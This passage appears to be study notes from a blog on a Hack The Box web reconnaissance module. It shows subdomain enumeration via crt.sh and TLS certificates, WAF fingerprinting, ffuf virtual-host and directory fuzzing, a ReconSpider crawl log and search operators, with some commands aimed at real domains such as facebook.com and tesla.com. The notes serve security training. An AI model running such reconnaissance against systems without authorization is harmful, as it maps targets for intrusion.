noopener">https://crt.sh</a></p></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ <span class=nb>export</span> <span class=nv>TARGET</span><span class=o>=</span><span class=s2>&#34;facebook.com&#34;</span>
</span></span><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ curl -s <span class=s2>&#34;https://crt.sh/?q=</span><span class=si>${</span><span class=nv>TARGET</span><span class=si>}</span><span class=s2>&amp;output=json&#34;</span> <span class=p>|</span> jq -r <span class=s1>&#39;.[] | &#34;\(.name_value)\n\(.common_name)&#34;&#39;</span> <span class=p>|</span> sort -u &gt; <span class=s2>&#34;</span><span class=si>${</span><span class=nv>TARGET</span><span class=si>}</span><span class=s2>_crt.sh.txt&#34;</span>
</span></span><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ head -n20 facebook.com_crt.sh.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*.adtools.facebook.com
</span></span><span class=line><span class=cl>*.ak.facebook.com
</span></span><span class=line><span class=cl>*.ak.fbcdn.net
</span></span><span class=line><span class=cl>*.alpha.facebook.com
</span></span><span class=line><span class=cl>*.assistant.facebook.com
</span></span><span class=line><span class=cl>*.beta.facebook.com
</span></span><span class=line><span class=cl>*.channel.facebook.com
</span></span><span class=line><span class=cl>*.cinyour.facebook.com
</span></span><span class=line><span class=cl>*.cinyourrc.facebook.com
</span></span><span class=line><span class=cl>*.connect.facebook.com
</span></span><span class=line><span class=cl>*.cstools.facebook.com
</span></span><span class=line><span class=cl>*.ctscan.facebook.com
</span></span><span class=line><span class=cl>*.dev.facebook.com
</span></span><span class=line><span class=cl>*.dns.facebook.com
</span></span><span class=line><span class=cl>*.extern.facebook.com
</span></span><span class=line><span class=cl>*.extools.facebook.com
</span></span><span class=line><span class=cl>*.f--facebook.com
</span></span><span class=line><span class=cl>*.facebook.com
</span></span><span class=line><span class=cl>*.facebookcorewwwi.onion
</span></span><span class=line><span class=cl>*.facebookmail.com
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ <span class=nb>export</span> <span class=nv>TARGET</span><span class=o>=</span><span class=s2>&#34;facebook.com&#34;</span>
</span></span><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ <span class=nb>export</span> <span class=nv>PORT</span><span class=o>=</span><span class=s2>&#34;443&#34;</span>
</span></span><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ openssl s_client -ign_eof 2&gt;/dev/null <span class=o>&lt;&lt;&lt;</span><span class=s1>$&#39;HEAD / HTTP/1.0\r\n\r&#39;</span> -connect <span class=s2>&#34;</span><span class=si>${</span><span class=nv>TARGET</span><span class=si>}</span><span class=s2>:</span><span class=si>${</span><span class=nv>PORT</span><span class=si>}</span><span class=s2>&#34;</span> <span class=p>|</span> openssl x509 -noout -text -in - <span class=p>|</span> grep <span class=s1>&#39;DNS&#39;</span> <span class=p>|</span> sed -e <span class=s1>&#39;s|DNS:|\n|g&#39;</span> -e <span class=s1>&#39;s|^\*.*||g&#39;</span> <span class=p>|</span> tr -d <span class=s1>&#39;,&#39;</span> <span class=p>|</span> sort -u
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*.facebook.com
</span></span><span class=line><span class=cl>*.facebook.net
</span></span><span class=line><span class=cl>*.fbcdn.net
</span></span><span class=line><span class=cl>*.fbsbx.com
</span></span><span class=line><span class=cl>*.m.facebook.com
</span></span><span class=line><span class=cl>*.messenger.com
</span></span><span class=line><span class=cl>*.xx.fbcdn.net
</span></span><span class=line><span class=cl>*.xy.fbcdn.net
</span></span><span class=line><span class=cl>*.xz.fbcdn.net
</span></span><span class=line><span class=cl>facebook.com
</span></span><span class=line><span class=cl>messenger.com
</span></span></code></pre></div><p><strong>Automating Passive Subdomain Enumeration</strong></p><p><strong>TheHarvester</strong> is a simple-to-use yet powerful and effective tool for early-stage penetration testing and red team engagements. We can use it to gather information to help identify a company&rsquo;s attack surface. The tool collects emails, names, subdomains, IP addresses, and URLs from various public data sources for passive information gathering.</p><h3 id=passive-infrastructure-identification>Passive Infrastructure Identification<a hidden class=anchor aria-hidden=true href=#passive-infrastructure-identification>#</a></h3><p><strong><a href=https://sitereport.netcraft.com title=Netcraft target=_blank rel="nofollow noopener">Netcraft</a></strong></p><p>Netcraft can offer us information about the servers without even interacting with them, and this is something valuable from a passive information gathering point of view.</p><p><strong><a href=http://web.archive.org/ title="Wayback Machine" target=_blank rel="nofollow noopener">Wayback Machine</a></strong></p><p>The Internet Archive is an American digital library that provides free public access to digitalized materials, including websites, collected automatically via its web crawlers.</p><h3 id=active-infrastructure-identification>Active Infrastructure Identification<a hidden class=anchor aria-hidden=true href=#active-infrastructure-identification>#</a></h3><p><strong><a href=https://www.morningstarsecurity.com/research/whatweb title=WhatWeb target=_blank rel="nofollow noopener">WhatWeb</a></strong></p><p>Whatweb recognizes web technologies, including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.</p><p><strong><a href=https://www.wappalyzer.com/ title=Wappalyzer target=_blank rel="nofollow noopener">Wappalyzer</a></strong></p><p>The GUI extension version of WhatWeb.</p><p><strong><a href=https://github.com/EnableSecurity/wafw00f title=WafW00f target=_blank rel="nofollow noopener">WafW00f</a></strong></p><p>WAFW00F is a tool used to identify and fingerprint Web Application Firewalls (WAF) that are protecting a website. It allows users to detect the presence and type of WAFs by sending a series of test requests and analyzing the responses.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ wafw00f -v https://www.tesla.com
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                   ______
</span></span><span class=line><span class=cl>                  /      <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>                 <span class=o>(</span>  Woof! <span class=o>)</span>
</span></span><span class=line><span class=cl>                  <span class=se>\ </span> ____/                      <span class=o>)</span>
</span></span><span class=line><span class=cl>                  ,,                           <span class=o>)</span> <span class=o>(</span>_
</span></span><span class=line><span class=cl>             .-. -    _______                 <span class=o>(</span> <span class=p>|</span>__<span class=p>|</span>
</span></span><span class=line><span class=cl>            <span class=o>()</span><span class=sb>``</span><span class=p>;</span> <span class=p>|</span><span class=o>==</span><span class=p>|</span>_______<span class=o>)</span>                .<span class=o>)</span><span class=p>|</span>__<span class=p>|</span>
</span></span><span class=line><span class=cl>            / <span class=o>(</span><span class=err>&#39;</span>        /<span class=p>|</span><span class=se>\ </span>                 <span class=o>(</span>  <span class=p>|</span>__<span class=p>|</span>
</span></span><span class=line><span class=cl>        <span class=o>(</span>  /  <span class=o>)</span>        / <span class=p>|</span> <span class=se>\ </span>                 . <span class=p>|</span>__<span class=p>|</span>
</span></span><span class=line><span class=cl>         <span class=se>\(</span>_<span class=o>)</span>_<span class=o>))</span>      /  <span class=p>|</span>  <span class=se>\ </span>                  <span class=p>|</span>__<span class=p>|</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    ~ WAFW00F : v2.1.0 ~
</span></span><span class=line><span class=cl>    The Web Application Firewall Fingerprinting Toolkit
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Checking https://www.tesla.com
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> The site https://www.tesla.com is behind CacheWall <span class=o>(</span>Varnish<span class=o>)</span> WAF.
</span></span><span class=line><span class=cl><span class=o>[</span>~<span class=o>]</span> Number of requests: <span class=m>2</span>
</span></span></code></pre></div><p><strong><a href=https://github.com/michenriksen/aquatone title=Aquatone target=_blank rel="nofollow noopener">Aquatone</a></strong></p><p>Aquatone is a tool for automatic and visual inspection of websites across many hosts and is convenient for quickly gaining an overview of HTTP-based attack surfaces by scanning a list of configurable ports, visiting the website with a headless Chrome browser, and taking a screenshot. This is helpful, especially when dealing with huge subdomain lists.</p><h3 id=active-subdomain-enumeration>Active Subdomain Enumeration<a hidden class=anchor aria-hidden=true href=#active-subdomain-enumeration>#</a></h3><p><strong>ZoneTransfer</strong></p><p><a href=https://hackertarget.com/zone-transfer/ title=https://hackertarget.com/zone-transfer/ target=_blank rel="nofollow noopener">https://hackertarget.com/zone-transfer/</a> is a good tool for identifying zone transfers.</p><p><strong>Gobuster</strong></p><p>Gobuster is a tool that we can use to perform subdomain enumeration. It is especially interesting for us the patterns options as we have learned some naming conventions from the passive information gathering we can use to discover new subdomains following the same pattern.</p><h3 id=virtual-hosts>Virtual Hosts<a hidden class=anchor aria-hidden=true href=#virtual-hosts>#</a></h3><p>A virtual host (vHost) is a feature that allows several websites to be hosted on a single server. This is an excellent solution if you have many websites and don&rsquo;t want to go through the time-consuming (and expensive) process of setting up a new web server for each one. Imagine having to set up a different webserver for a mobile and desktop version of the same page.</p><p><strong>Automating Virtual Hosts Discovery</strong>
We can use this manual approach for a small list of virtual hosts, but it will not be feasible if we have an extensive list. Using <a href=https://github.com/ffuf/ffuf title=ffuf target=_blank rel="nofollow noopener">ffuf</a>, we can speed up the process and filter based on parameters present in the response. Let&rsquo;s replicate the same process we did with ffuf, but first, let&rsquo;s look at some of its options.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.129.73.87 -H <span class=s2>&#34;HOST: FUZZ.inlanefreight.htb&#34;</span> -mr <span class=s2>&#34;HTB&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        /<span class=s1>&#39;___\  /&#39;</span>___<span class=se>\ </span>          /<span class=err>&#39;</span>___<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>       /<span class=se>\ \_</span>_/ /<span class=se>\ \_</span>_/  __  __  /<span class=se>\ \_</span>_/
</span></span><span class=line><span class=cl>       <span class=se>\ \ </span>,__<span class=se>\\</span> <span class=se>\ </span>,__<span class=se>\/\ \/\ \ \ \ </span>,__<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>        <span class=se>\ \ \_</span>/ <span class=se>\ \ \_</span>/<span class=se>\ \ \_\ \ \ \ \_</span>/
</span></span><span class=line><span class=cl>         <span class=se>\ \_\ </span>  <span class=se>\ \_\ </span> <span class=se>\ \_</span>___/  <span class=se>\ \_\
</span></span></span><span class=line><span class=cl><span class=se></span>          <span class=se>\/</span>_/    <span class=se>\/</span>_/   <span class=se>\/</span>___/    <span class=se>\/</span>_/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       v1.4.1-dev
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> :: Method           : GET
</span></span><span class=line><span class=cl> :: URL              : http://10.129.73.87
</span></span><span class=line><span class=cl> :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span><span class=line><span class=cl> :: Header           : Host: FUZZ.inlanefreight.htb
</span></span><span class=line><span class=cl> :: Follow redirects : <span class=nb>false</span>
</span></span><span class=line><span class=cl> :: Calibration      : <span class=nb>false</span>
</span></span><span class=line><span class=cl> :: Timeout          : <span class=m>10</span>
</span></span><span class=line><span class=cl> :: Threads          : <span class=m>40</span>
</span></span><span class=line><span class=cl> :: Matcher          : Regexp: HTB
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www2                    <span class=o>[</span>Status: 200, Size: 96, Words: 2, Lines: 6, Duration: 9ms<span class=o>]</span>
</span></span><span class=line><span class=cl>app                     <span class=o>[</span>Status: 200, Size: 103, Words: 3, Lines: 6, Duration: 5ms<span class=o>]</span>
</span></span><span class=line><span class=cl>citrix                  <span class=o>[</span>Status: 200, Size: 100, Words: 3, Lines: 6, Duration: 5ms<span class=o>]</span>
</span></span><span class=line><span class=cl>ap                      <span class=o>[</span>Status: 200, Size: 102, Words: 3, Lines: 6, Duration: 3ms<span class=o>]</span>
</span></span><span class=line><span class=cl>customers               <span class=o>[</span>Status: 200, Size: 94, Words: 3, Lines: 6, Duration: 2ms<span class=o>]</span>
</span></span><span class=line><span class=cl>dmz                     <span class=o>[</span>Status: 200, Size: 95, Words: 2, Lines: 6, Duration: 5ms<span class=o>]</span>
</span></span><span class=line><span class=cl>:: Progress: <span class=o>[</span>4997/4997<span class=o>]</span> :: Job <span class=o>[</span>1/1<span class=o>]</span> :: <span class=m>3262</span> req/sec :: Duration: <span class=o>[</span>0:00:01<span class=o>]</span> :: Errors: <span class=m>0</span> ::
</span></span></code></pre></div><h3 id=crawling>Crawling<a hidden class=anchor aria-hidden=true href=#crawling>#</a></h3><p><strong><a href=https://www.zaproxy.org/ title=ZAP target=_blank rel="nofollow noopener">ZAP</a></strong></p><p>Zed Attack Proxy (ZAP) is an open-source web proxy that belongs to the <a href=https://owasp.org/ title="Open Web Application Security Project" target=_blank rel="nofollow noopener">Open Web Application Security Project</a> (OWASP). It allows us to perform manual and automated security testing on web applications. Using it as a proxy server will enable us to intercept and manipulate all the traffic that passes through it.</p><p><strong><a href=https://github.com/ffuf/ffuf title=FFuF target=_blank rel="nofollow noopener">FFuF</a></strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ ffuf -recursion -recursion-depth <span class=m>1</span> -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        /<span class=s1>&#39;___\  /&#39;</span>___<span class=se>\ </span>          /<span class=err>&#39;</span>___<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>       /<span class=se>\ \_</span>_/ /<span class=se>\ \_</span>_/  __  __  /<span class=se>\ \_</span>_/
</span></span><span class=line><span class=cl>       <span class=se>\ \ </span>,__<span class=se>\\</span> <span class=se>\ </span>,__<span class=se>\/\ \/\ \ \ \ </span>,__<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>        <span class=se>\ \ \_</span>/ <span class=se>\ \ \_</span>/<span class=se>\ \ \_\ \ \ \ \_</span>/
</span></span><span class=line><span class=cl>         <span class=se>\ \_\ </span>  <span class=se>\ \_\ </span> <span class=se>\ \_</span>___/  <span class=se>\ \_\
</span></span></span><span class=line><span class=cl><span class=se></span>          <span class=se>\/</span>_/    <span class=se>\/</span>_/   <span class=se>\/</span>___/    <span class=se>\/</span>_/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       v1.1.0-git
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> :: Method           : GET
</span></span><span class=line><span class=cl> :: URL              : http://192.168.10.10/FUZZ
</span></span><span class=line><span class=cl> :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
</span></span><span class=line><span class=cl> :: Follow redirects : <span class=nb>false</span>
</span></span><span class=line><span class=cl> :: Calibration      : <span class=nb>false</span>
</span></span><span class=line><span class=cl> :: Timeout          : <span class=m>10</span>
</span></span><span class=line><span class=cl> :: Threads          : <span class=m>40</span>
</span></span><span class=line><span class=cl> :: Matcher          : Response status: 200,204,301,302,307,401,403,405
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>wp-admin                <span class=o>[</span>Status: 301, Size: 317, Words: 20, Lines: 10<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> Adding a new job to the queue: http://192.168.10.10/wp-admin/FUZZ
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>wp-includes             <span class=o>[</span>Status: 301, Size: 320, Words: 20, Lines: 10<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> Adding a new job to the queue: http://192.168.10.10/wp-includes/FUZZ
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>wp-content              <span class=o>[</span>Status: 301, Size: 319, Words: 20, Lines: 10<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> Adding a new job to the queue: http://192.168.10.10/wp-content/FUZZ
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>admin                   <span class=o>[</span>Status: 302, Size: 0, Words: 1, Lines: 1<span class=o>]</span>
</span></span><span class=line><span class=cl>login                   <span class=o>[</span>Status: 302, Size: 0, Words: 1, Lines: 1<span class=o>]</span>
</span></span><span class=line><span class=cl>feed                    <span class=o>[</span>Status: 301, Size: 0, Words: 1, Lines: 1<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> Adding a new job to the queue: http://192.168.10.10/feed/FUZZ
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><p><strong>ReconSpider</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
</span></span><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ unzip ReconSpider.zip
</span></span><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ python3 ReconSpider.py http://inlanefreight.com
</span></span><span class=line><span class=cl>2024-08-23 11:23:56 <span class=o>[</span>scrapy.utils.log<span class=o>]</span> INFO: Scrapy 2.11.2 started <span class=o>(</span>bot: scrapybot<span class=o>)</span>
</span></span><span class=line><span class=cl>2024-08-23 11:23:56 <span class=o>[</span>scrapy.utils.log<span class=o>]</span> INFO: Versions: lxml 4.9.2.0, libxml2 2.9.14, cssselect 1.2.0, parsel 1.9.1, w3lib 2.2.1, Twisted 24.7.0, Python 3.11.2 <span class=o>(</span>main, May  <span class=m>2</span> 2024, 11:59:08<span class=o>)</span> <span class=o>[</span>GCC 12.2.0<span class=o>]</span>, pyOpenSSL 24.1.0 <span class=o>(</span>OpenSSL 3.2.2 <span class=m>4</span> Jun 2024<span class=o>)</span>, cryptography 42.0.8, Platform Linux-6.5.0-13parrot1-amd64-x86_64-with-glibc2.36
</span></span><span class=line><span class=cl>2024-08-23 11:23:56 <span class=o>[</span>scrapy.addons<span class=o>]</span> INFO: Enabled addons:
</span></span><span class=line><span class=cl><span class=o>[]</span>
</span></span><span class=line><span class=cl>2024-08-23 11:23:56 <span class=o>[</span>py.warnings<span class=o>]</span> WARNING: /home/htb-ac-713396/.local/lib/python3.11/site-packages/scrapy/utils/request.py:254: ScrapyDeprecationWarning: <span class=s1>&#39;2.6&#39;</span> is a deprecated value <span class=k>for</span> the <span class=s1>&#39;REQUEST_FINGERPRINTER_IMPLEMENTATION&#39;</span> setting.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>It is also the default value. In other words, it is normal to get this warning <span class=k>if</span> you have not defined a value <span class=k>for</span> the <span class=s1>&#39;REQUEST_FINGERPRINTER_IMPLEMENTATION&#39;</span> setting. This is so <span class=k>for</span> backward compatibility reasons, but it will change in a future version of Scrapy.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>See the documentation of the <span class=s1>&#39;REQUEST_FINGERPRINTER_IMPLEMENTATION&#39;</span> setting <span class=k>for</span> information on how to handle this deprecation.
</span></span><span class=line><span class=cl>  <span class=k>return</span> cls<span class=o>(</span>crawler<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2024-08-23 11:23:56 <span class=o>[</span>scrapy.extensions.telnet<span class=o>]</span> INFO: Telnet Password: 82c52ae64678c537
</span></span><span class=line><span class=cl>2024-08-23 11:23:56 <span class=o>[</span>scrapy.middleware<span class=o>]</span> INFO: Enabled extensions:
</span></span><span class=line><span class=cl><span class=o>[</span><span class=s1>&#39;scrapy.extensions.corestats.CoreStats&#39;</span>,
</span></span><span class=line><span class=cl> <span class=s1>&#39;scrapy.extensions.telnet.TelnetConsole&#39;</span>,
</span></span><span class=line><span class=cl> <span class=s1>&#39;scrapy.extensions.memusage.MemoryUsage&#39;</span>,
</span></span><span class=line><span class=cl> <span class=s1>&#39;scrapy.extensions.logstats.LogStats&#39;</span><span class=o>]</span>
</span></span><span class=line><span class=cl>2024-08-23 11:23:56 <span class=o>[</span>scrapy.crawler<span class=o>]</span> INFO: Overridden settings:
</span></span><span class=line><span class=cl><span class=o>{</span><span class=s1>&#39;LOG_LEVEL&#39;</span>: <span class=s1>&#39;INFO&#39;</span><span class=o>}</span>
</span></span><span class=line><span class=cl>2024-08-23 11:23:56 <span class=o>[</span>scrapy.middleware<span class=o>]</span> INFO: Enabled downloader middlewares:
</span></span><span class=line><span class=cl><span class=o>[</span><span class=s1>&#39;scrapy.downloadermiddlewares.offsite.OffsiteMiddleware&#39;</span>,
</span></span><span class=line><span class=cl> <span class=s1>&#39;scrapy.downloadermiddlewares.httpauth.HttpAuthMiddleware&#39;</span>,
</span></span><span class=line><span class=cl> <span class=s1>&#39;scrapy.downloadermiddlewares.downloadtimeout.DownloadTimeoutMiddleware&#39;</span>,
</span></span><span class=line><span class=cl> <span class=s1>&#39;scrapy.downloadermiddlewares.defaultheaders.DefaultHeadersMiddleware&#39;</span>,
</span></span><span class=line><span class=cl> <span class=s1>&#39;scrapy.downloadermiddlewares.useragent.UserAgentMiddleware&#39;</span>,
</span></span><span class=line><span class=cl> <span class=s1>&#39;__main__.CustomOffsiteMiddleware&#39;</span>,
</span></span><span class=line><span class=cl> <span class=s1>&#39;scrapy.downloadermiddlewares.retry.RetryMiddleware&#39;</span>,
</span></span><span class=line><span class=cl> <span class=s1>&#39;scrapy.downloadermiddlewares.redirect.MetaRefreshMiddleware&#39;</span>,
</span></span><span class=line><span class=cl> <span class=s1>&#39;scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware&#39;</span>,
</span></span><span class=line><span class=cl> <span class=s1>&#39;scrapy.downloadermiddlewares.redirect.RedirectMiddleware&#39;</span>,
</span></span><span class=line><span class=cl> <span class=s1>&#39;scrapy.downloadermiddlewares.cookies.CookiesMiddleware&#39;</span>,
</span></span><span class=line><span class=cl> <span class=s1>&#39;scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware&#39;</span>,
</span></span><span class=line><span class=cl> <span class=s1>&#39;scrapy.downloadermiddlewares.stats.DownloaderStats&#39;</span><span class=o>]</span>
</span></span><span class=line><span class=cl>2024-08-23 11:23:56 <span class=o>[</span>scrapy.middleware<span class=o>]</span> INFO: Enabled spider middlewares:
</span></span><span class=line><span class=cl><span class=o>[</span><span class=s1>&#39;scrapy.spidermiddlewares.httperror.HttpErrorMiddleware&#39;</span>,
</span></span><span class=line><span class=cl> <span class=s1>&#39;scrapy.spidermiddlewares.referer.RefererMiddleware&#39;</span>,
</span></span><span class=line><span class=cl> <span class=s1>&#39;scrapy.spidermiddlewares.urllength.UrlLengthMiddleware&#39;</span>,
</span></span><span class=line><span class=cl> <span class=s1>&#39;scrapy.spidermiddlewares.depth.DepthMiddleware&#39;</span><span class=o>]</span>
</span></span><span class=line><span class=cl>2024-08-23 11:23:56 <span class=o>[</span>scrapy.middleware<span class=o>]</span> INFO: Enabled item pipelines:
</span></span><span class=line><span class=cl><span class=o>[]</span>
</span></span><span class=line><span class=cl>2024-08-23 11:23:56 <span class=o>[</span>scrapy.core.engine<span class=o>]</span> INFO: Spider opened
</span></span><span class=line><span class=cl>2024-08-23 11:23:56 <span class=o>[</span>scrapy.extensions.logstats<span class=o>]</span> INFO: Crawled <span class=m>0</span> pages <span class=o>(</span>at <span class=m>0</span> pages/min<span class=o>)</span>, scraped <span class=m>0</span> items <span class=o>(</span>at <span class=m>0</span> items/min<span class=o>)</span>
</span></span><span class=line><span class=cl>2024-08-23 11:23:56 <span class=o>[</span>scrapy.extensions.telnet<span class=o>]</span> INFO: Telnet console listening on 127.0.0.1:6023
</span></span><span class=line><span class=cl>2024-08-23 11:23:58 <span class=o>[</span>scrapy.core.engine<span class=o>]</span> INFO: Closing spider <span class=o>(</span>finished<span class=o>)</span>
</span></span><span class=line><span class=cl>2024-08-23 11:23:58 <span class=o>[</span>scrapy.statscollectors<span class=o>]</span> INFO: Dumping Scrapy stats:
</span></span><span class=line><span class=cl><span class=o>{</span><span class=s1>&#39;downloader/request_bytes&#39;</span>: 2737,
</span></span><span class=line><span class=cl> <span class=s1>&#39;downloader/request_count&#39;</span>: 10,
</span></span><span class=line><span class=cl> <span class=s1>&#39;downloader/request_method_count/GET&#39;</span>: 10,
</span></span><span class=line><span class=cl> <span class=s1>&#39;downloader/response_bytes&#39;</span>: 93960,
</span></span><span class=line><span class=cl> <span class=s1>&#39;downloader/response_count&#39;</span>: 10,
</span></span><span class=line><span class=cl> <span class=s1>&#39;downloader/response_status_count/200&#39;</span>: 8,
</span></span><span class=line><span class=cl> <span class=s1>&#39;downloader/response_status_count/301&#39;</span>: 2,
</span></span><span class=line><span class=cl> <span class=s1>&#39;dupefilter/filtered&#39;</span>: 52,
</span></span><span class=line><span class=cl> <span class=s1>&#39;elapsed_time_seconds&#39;</span>: 1.985026,
</span></span><span class=line><span class=cl> <span class=s1>&#39;finish_reason&#39;</span>: <span class=s1>&#39;finished&#39;</span>,
</span></span><span class=line><span class=cl> <span class=s1>&#39;finish_time&#39;</span>: datetime.datetime<span class=o>(</span>2024, 8, 23, 16, 23, 58, 657631, <span class=nv>tzinfo</span><span class=o>=</span>datetime.timezone.utc<span class=o>)</span>,
</span></span><span class=line><span class=cl> <span class=s1>&#39;httpcompression/response_bytes&#39;</span>: 162654,
</span></span><span class=line><span class=cl> <span class=s1>&#39;httpcompression/response_count&#39;</span>: 7,
</span></span><span class=line><span class=cl> <span class=s1>&#39;log_count/INFO&#39;</span>: 10,
</span></span><span class=line><span class=cl> <span class=s1>&#39;log_count/WARNING&#39;</span>: 1,
</span></span><span class=line><span class=cl> <span class=s1>&#39;memusage/max&#39;</span>: 78577664,
</span></span><span class=line><span class=cl> <span class=s1>&#39;memusage/startup&#39;</span>: 78577664,
</span></span><span class=line><span class=cl> <span class=s1>&#39;request_depth_max&#39;</span>: 2,
</span></span><span class=line><span class=cl> <span class=s1>&#39;response_received_count&#39;</span>: 8,
</span></span><span class=line><span class=cl> <span class=s1>&#39;scheduler/dequeued&#39;</span>: 10,
</span></span><span class=line><span class=cl> <span class=s1>&#39;scheduler/dequeued/memory&#39;</span>: 10,
</span></span><span class=line><span class=cl> <span class=s1>&#39;scheduler/enqueued&#39;</span>: 10,
</span></span><span class=line><span class=cl> <span class=s1>&#39;scheduler/enqueued/memory&#39;</span>: 10,
</span></span><span class=line><span class=cl> <span class=s1>&#39;start_time&#39;</span>: datetime.datetime<span class=o>(</span>2024, 8, 23, 16, 23, 56, 672605, <span class=nv>tzinfo</span><span class=o>=</span>datetime.timezone.utc<span class=o>)}</span>
</span></span><span class=line><span class=cl>2024-08-23 11:23:58 <span class=o>[</span>scrapy.core.engine<span class=o>]</span> INFO: Spider closed <span class=o>(</span>finished<span class=o>)</span>
</span></span></code></pre></div><h3 id=search-engine-discovery>Search Engine Discovery<a hidden class=anchor aria-hidden=true href=#search-engine-discovery>#</a></h3><table><thead><tr><th style=text-align:left><strong>Operator</strong></th><th style=text-align:left><strong>Operator Description</strong></th><th style=text-align:left><strong>Example</strong></th><th style=text-align:left><strong>Example Description</strong></th></tr></thead><tbody><tr><td style=text-align:left><code>site:</code></td><td style=text-align:left>Limits results to a specific website or domain.</td><td style=text-align:left><code>site:example.com</code></td><td style=text-align:left>Find all publicly accessible pages on example.com.</td></tr><tr><td style=text-align:left><code>inurl:</code></td><td style=text-align:left>Finds pages with a specific term in the URL.</td><td style=text-align:left><code>inurl:login</code></td><td style=text-align:left>Search for login pages on any website.</td></tr><tr><td style=text-align:left><code>filetype:</code></td><td style=text-align:left>Searches for files of a particular type.</td><td style=text-align:left><code>filetype:pdf</code></td><td style=text-align:left>Find downloadable PDF documents.</td></tr><tr><td style=text-align:left><code>intitle:</code></td><td style=text-align:left>Finds pages with a specific term in the title.</td><td style=text-align:left><code>intitle:"confidential report"</code></td><td style=text-align:left>Look for documents titled &ldquo;confidential report&rdquo; or similar variations.</td></tr><tr><td style=text-align:left><code>intext:</code> or <code>inbody:</code></td><td style=text-align:left>Searches for a term within the body text of pages.</td><td style=text-align:left><code>intext:"password reset"</code></td><td style=text-align:left>Identify webpages containing the term &ldquo;password reset&rdquo;.</td></tr><tr><td style=text-align:left><code>cache:</code></td><td style=text-align:left>Displays the cached version of a webpage (if available).</td><td style=text-align:left><code>cache:example.com</code></td><td style=text-align:left>View the cached version of example.com to see its previous content.</td></tr><tr><td style=text-align:left><code>link:</code></td><td style=text-align:left>Finds pages that link to a specific webpage.</td><td style=text-align:left><code>link:example.com</code></td><td style=text-align:left>Identify websites linking to example.com.</td></tr><tr><td style=text-align:left><code>related:</code></td><td style=text-align:left>Finds websites related to a specific webpage.</td><td style=text-align:left><code>related:example.com</code></td><td style=text-align:left>Discover websites similar to example.com.</td></tr><tr><td style=text-align:left><code>info:</code></td><td style=text-align:left>Provides a summary of information about a webpage.</td><td style=text-align:left><code>info:example.com</code></td><td style=text-align:left>Get basic details about example.com, such as its title and description.</td></tr><tr><td 